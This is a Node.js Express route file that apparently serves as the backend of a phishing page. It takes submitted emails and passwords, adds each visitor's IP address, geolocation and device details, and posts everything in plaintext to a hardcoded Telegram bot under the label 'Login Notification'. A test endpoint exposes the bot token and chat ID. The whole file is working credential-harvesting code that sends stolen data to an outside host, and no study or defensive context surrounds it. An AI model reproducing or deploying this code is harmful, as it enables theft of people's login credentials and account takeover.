const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// ✅ USE THESE CREDENTIALS (the ones you confirmed)
const BOT_TOKEN = "5805445041:AAEyEOk6JELDr7SLFORniePoZsusK9peChs";
const CHAT_ID = "1527776859";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

router.post('/', async (req, res) => {
    try {
        console.log('📨 Received login request:', req.body);

        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                message: "Missing email or password" 
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the Telegram message
        const message = `
📌 *Login Notification*
- Email: ${email}
- Password: ${password}
- IP: ${ip}
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        console.log('📤 Sending to Telegram...');

        // Send to Telegram
        const telegramResponse = await fetch(TELEGRAM_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const telegramResult = await telegramResponse.json();
        
        if (!telegramResponse.ok) {
            console.error('❌ Telegram API error:', telegramResult);
            throw new Error(`Telegram API error: ${JSON.stringify(telegramResult)}`);
        }

        console.log(`✅ Telegram notification sent for ${email}`);

        res.status(200).json({
            success: true,
            message: "Notification sent successfully via Telegram",
            telegramSent: true,
            loginDetails: { 
                device: deviceType, 
                ip, 
                location: locationStr
            }
        });

    } catch (error) {
        console.error("❌ Error:", error);
        res.status(500).json({ 
            success: false, 
            message: "Failed to send notification", 
            error: error.message 
        });
    }
});

// Test endpoint to verify bot is working
router.get('/test', async (req, res) => {
    try {
        const botTest = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const botInfo = await botTest.json();
        
        res.json({
            message: "Backend route is working!",
            botInfo: botInfo,
            credentials: {
                botToken: BOT_TOKEN,
                chatId: CHAT_ID
            }
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;